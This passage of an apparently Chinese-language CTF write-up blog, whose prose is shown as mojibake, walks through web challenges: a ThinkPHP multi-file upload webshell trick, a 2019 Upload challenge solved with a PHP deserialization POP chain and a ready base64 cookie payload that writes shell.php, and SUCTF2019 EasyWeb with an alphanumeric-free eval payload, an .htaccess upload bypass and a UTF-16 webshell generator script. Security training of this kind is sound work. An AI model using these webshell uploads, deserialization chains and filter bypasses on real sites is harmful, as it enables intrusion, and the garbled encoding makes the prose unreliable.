¹æ®æŠ¥é”™ä¿¡æ¯ï¼Œå‘ç°æ˜¯ThinkPHP3.2.4ç‰ˆæœ¬ï¼Œä»GitHubä¸Šä¸‹è½½ä¸‹æ¥å®¡è®¡ä¸€ä¸‹ï¼Œå‘ç°ä¸Šä¼ æ¨¡å—æœ‰ä¸€ä¸ªé—®é¢˜ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819104409.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ·æ‰€å†™å¾—ä»£ç ä½¿ç”¨æ—¶æœªæŒ‡å®šfilesï¼Œé»˜è®¤ä¸º<code>$_FILES</code>ï¼Œè¿™æ„å‘³ç€ï¼Œæ‰€æœ‰<code>$_FILES</code>ä¸­çš„æ–‡ä»¶éƒ½ä¼šè¢«ä¸Šä¼ ã€‚è€Œä»£ç åªä¼šè¿‡æ»¤<code>$_FILES['file']</code>ä¸­çš„æ–‡ä»¶ã€‚æ‰€ä»¥ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªnameä¸ºfileçš„æ­£å¸¸å›¾ç‰‡ï¼Œå¦ä¸€ä¸ªnameä¸ºå…¶ä»–çš„webshellã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>æœ€åä¼šæ‰“å°å‡º<code>$_FILES['file']</code>çš„æ–‡ä»¶åœ°å€ï¼Œè€Œä¸ä¼šæ‰“å°æˆ‘ä»¬shellçš„åœ°å€ã€‚</p><p>ThinkPHP3é»˜è®¤ä½¿ç”¨uniqid()å‡½æ•°æ ¹æ®æ—¶é—´ç”Ÿæˆæ–‡ä»¶åï¼Œä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶é—´ç›¸è¿‘å¯ä»¥çˆ†ç ´ã€‚</p><p>æœ€åä¸Šä¼ çš„phpä¼šè¢«åå°æ›¿æ¢æˆflagã€‚</p><h2 id="å¼ºç½‘æ¯-2019-Upload">å¼ºç½‘æ¯ 2019 Upload</h2><h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3><ul><li>PHPååºåˆ—åŒ–POPé“¾æ„é€ </li></ul><h3 id="è§£é¢˜-v5">è§£é¢˜</h3><p>æ³¨å†Œä¹‹åæŸ¥çœ‹cookieå‘ç°æ˜¯ä¸€ä¸ªbase64ç¼–ç åçš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:3;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:5:&quot;email&quot;;s:15:&quot;admin@admin.com&quot;;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;s:3:&quot;img&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>æ‰«ç›®å½•å¾—åˆ° <code>www.tar.gz</code> å‹ç¼©åŒ…ï¼Œä»£ç å®¡è®¡</p><p>ç”¨PHPStormæ‰“å¼€ä¼šå‘ç°æœ‰ä¸¤ä¸ªæ–­ç‚¹ï¼Œåº”è¯¥æ˜¯ç»™çš„hint</p><p><code>Register.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724164356.png" alt=""></p><p><code>Index.php</code>ä¸­æœ‰ä¸€ä¸ªæŠŠcookieååºåˆ—åŒ–çš„åœ°æ–¹ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724164417.png" alt=""></p><p>è¿™ä¹ˆæ¥çœ‹åº”è¯¥æ˜¯æ„é€ ååºåˆ—åŒ–çš„POPé“¾ã€‚</p><p>åœ¨<code>Profile.php</code>å‘ç°å…³é”®ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè‚¯å®šæ˜¯åˆ©ç”¨<code>__call</code>å‡½æ•°å»æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤äº†ã€‚</p><p>æ„é€ POPé“¾å…ˆæ‰¾<code>__destruct</code>æ–¹æ³•ï¼Œå¾ˆæ˜æ˜¾åˆšåˆš<code>Register.php</code>ä¸­å°±æœ‰ææ„å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ç”¨<code>Register-&gt;checker = Profile</code>ï¼Œåˆ©ç”¨<code>Profile-&gt;index()</code>å»è§¦å‘<code>Profile</code>ç±»ä¸­çš„<code>__call</code>é­”æœ¯æ–¹æ³•ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>Profile.php</code>å½“ä¸­çš„<code>__call</code>æ–¹æ³•è°ƒç”¨çš„å‚æ•°æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ–‡æ¡£æˆ‘ä»¬å¯ä»¥çŸ¥é“<code>$name</code>æ˜¯ä¸å­˜åœ¨æ–¹æ³•çš„è°ƒç”¨çš„åå­—ï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯<code>index</code>ï¼Œ<code>$arguments</code>å°±æ˜¯ä¼ å…¥è°ƒç”¨æ–¹æ³•çš„å‚æ•°ï¼Œè¿™é‡Œå°±ä¸ºç©ºã€‚</p><p>è€Œå½“ä½¿ç”¨<code>$this-&gt;index</code>çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šè§¦å‘å¦ä¸€ä¸ªé­”æœ¯æ–¹æ³•<code>__get</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆè°ƒç”¨äº†<code>$this-&gt;except[$name]</code>ï¼Œè€Œ<code>$name</code>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>__call</code>è°ƒç”¨çš„å€¼ç¡®å®šä¸º<code>index</code>ï¼Œè€Œä¸”<code>Profile</code>ç±»å­˜åœ¨ä¸€ä¸ªå…¬æœ‰ç±»<code>except</code>å¯ä»¥ä¾›æˆ‘ä»¬ä¿®æ”¹ã€‚</p><p>æ¥ç€åˆ©ç”¨<code>_get</code>çš„è¿”å›ä¼šä½¿<code>__call</code>æ–¹æ³•ä¸­çš„<code>if</code>ä¸ºçœŸï¼Œæ‰§è¡Œ<code>$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</code>ã€‚</p><p>æœ‰äº†POPé“¾ä¹‹åï¼Œæˆ‘ä»¬åº”è¯¥å»è°ƒç”¨ä»€ä¹ˆå‡½æ•°å‘¢ï¼Œæ¥ç€çœ‹<code>Profile.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªifå¯ä»¥ç›´æ¥passï¼Œç¬¬äºŒä¸ªifè¯­å¥å¦‚æœæˆ‘ä»¬ä¸ä¸Šä¼ æ–‡ä»¶ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ï¼Œç¬¬ä¸‰ä¸ªifç›´æ¥èµ‹å€¼ç»•è¿‡ï¼Œç„¶åå¯ä»¥æ„é€ å›¾ç‰‡é©¬ç»•è¿‡<code>getimagesize</code>çš„åˆ¤æ–­ï¼Œæ§åˆ¶<code>$this-&gt;filename</code>ä¸ºphpåç¼€å½¢å¼ï¼Œè¿™æ ·åˆ©ç”¨<code>copy($this-&gt;filename_tmp, $this-&gt;filename)</code>å°±å¯ä»¥å¤åˆ¶å‡ºäº†ä¸€ä¸ª php webshell äº†ã€‚</p><p>æ„é€ payloadçš„expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$checker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $checker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp = <span class="string">&#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/00bf23e130fa1e525e332ff03dae345d.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">&#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/shell.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $ext = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register(<span class="keyword">new</span> Profile());</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo0OntzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2FkZWVlMGMxNzBhZDRmZmIxMTBkZjBjZGUyOTRhZWNkLzAwYmYyM2UxMzBmYTFlNTI1ZTMzMmZmMDNkYWUzNDVkLnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvYWRlZWUwYzE3MGFkNGZmYjExMGRmMGNkZTI5NGFlY2Qvc2hlbGwucGhwIjtzOjM6ImV4dCI7YjoxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7YjowO30&#x3D;</span><br></pre></td></tr></table></figure><p>å¡«åˆ°cookieä¸­ï¼Œåˆ·æ–°é¡µé¢</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724175540.png" alt=""></p><p>èšå‰‘è¿æ¥æ‹¿flagã€‚</p><h2 id="SUCTF2019-EasyWeb">SUCTF2019 EasyWeb</h2><h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3><ul><li>æ— å­—æ¯æ•°å­—webshell</li><li>æ–‡ä»¶ä¸Šä¼ </li><li>.htaccessåˆ©ç”¨</li></ul><h3 id="è§£é¢˜-v6">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å’Œæå®¢å¤§æŒ‘æˆ˜2019 RCE MEç±»ä¼¼çš„payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p>å¯ä»¥æˆåŠŸæ˜¾ç¤ºPHPINFOçš„ä¿¡æ¯ï¼Œæ³¨æ„å››ä¸ªç‚¹ï¼Œä¸€æ˜¯PHPç‰ˆæœ¬æ˜¯7.2ï¼ŒäºŒæ˜¯é¢˜ç›®çš„ç¯å¢ƒæ˜¯Apacheï¼Œä¸‰æ˜¯é™åˆ¶äº†open_basedirï¼Œæœ€åæ˜¯disable_functionã€‚</p><p>å†æ¥çœ‹get_the_flagå‡½æ•°ï¼ŒæŒ‰ç…§é¢˜æ„åº”è¯¥æ˜¯æƒ³è®©æˆ‘ä»¬é€šè¿‡è°ƒç”¨get_the_flagå‡½æ•°æ¥get shellï¼Œå‡½æ•°ä¸­æœ‰ä¸‰ä¸ªé™åˆ¶ï¼š</p><ul><li>æ–‡ä»¶å†…å®¹ä¸­ä¸èƒ½å‡ºç°<code>&lt;?</code></li><li>ä½¿ç”¨äº†exif_imagetypeæ¥åˆ¤æ–­æ˜¯ä¸æ˜¯å›¾ç‰‡</li><li>åç¼€åä¸­ä¸å…è®¸å‡ºç°ph</li></ul><p>è¿™é‡Œçš„é™åˆ¶æ¡ä»¶å°±æœ‰ç‚¹åƒSUCTF2019 CheckInï¼Œä¸åŒçš„æ˜¯é‚£é“é¢˜çš„ç¯å¢ƒæ˜¯nginxï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ <code>.user.ini</code>æ¥ç»•è¿‡ã€‚é‚£ä¹ˆè¿™é“é¢˜å¦‚æœè¦é€šè¿‡ä¸Šä¼ <code>.htaccess</code>æ¥ç»•è¿‡åç¼€åçš„é™åˆ¶ï¼Œå°±éœ€è¦ç»•è¿‡<code>exif_imagetype</code>ï¼Œå¹¶ä¸”ä¸èƒ½ç”¨GIF89aç­‰æ–‡ä»¶å¤´ï¼Œå› ä¸ºè¿™æ ·è™½ç„¶èƒ½ä¸Šä¼ æˆåŠŸï¼Œä½†<code>.htaccess</code>æ–‡ä»¶æ— æ³•ç”Ÿæ•ˆã€‚è¿™æ—¶æœ‰ä¸¤ä¸ªåŠæ³•ï¼š</p><ul><li><p>åœ¨.htaccesså‰æ·»åŠ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br></pre></td></tr></table></figure><p><code>#</code>åœ¨<code>.htaccess</code>æ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥<code>.htaccess</code>æ–‡ä»¶å¯ä»¥ç”Ÿæ•ˆ</p></li><li><p>åœ¨.<code>htaccess</code>å‰æ·»åŠ x00x00x8ax39x8ax39(è¦åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ·»åŠ ï¼Œæˆ–è€…ä½¿ç”¨pythonçš„bytesç±»å‹)<br>x00x00x8ax39x8ax39 æ˜¯wbmpæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œ<code>.htaccess</code>ä¸­ä»¥0x00å¼€å¤´çš„åŒæ ·ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“<code>.htaccess</code></p></li></ul><p>æœ€åå°±éœ€è¦ç»•è¿‡<code>&lt;?</code>ï¼ŒåŒæ ·ä¹Ÿæœ‰ä¸¤ä¸ªåŠæ³•ï¼Œä¸è¿‡åªæ˜¯ç¼–ç çš„ä¸åŒè€Œå·²ï¼Œä¸€ç§æ˜¯base64ç¼–ç ï¼Œä¸€ç§æ˜¯uft-16ç¼–ç ï¼Œéƒ½æ¥äº†è§£ä¸€ä¸‹ã€‚</p><p>å…ˆæ¥çœ‹utf-16çš„ç¼–ç æ–¹å¼ï¼Œè¿™æ˜¯<code>.htaccess</code>æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337                          # Define the width</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .cc         # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç»•è¿‡çš„åŸå› å€Ÿç”¨ä¸€ä¸‹<a href="https://www.cnblogs.com/tr1ple/p/11207145.html#jCmcxrz8">tr1pleå¸ˆå‚…çš„å›¾</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707153040.png" alt=""></p><p>ä¹Ÿå°±æ˜¯è¯´åŸæ¥æ˜¯utf-8ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—èŠ‚ï¼Œç°åœ¨utf-16æ˜¯ä¸¤ä¸ªå­—èŠ‚ç¼–ç ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆæ˜æ˜¾å¯ä»¥ç»•è¿‡å†…å®¹çš„è¿‡æ»¤ï¼Œexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Description : create and bypass file upload filter with .htaccess</span></span><br><span class="line"><span class="comment"># Author : Thibaud Robin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span></span><br><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = open(filename, <span class="string">&#x27;wb&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span 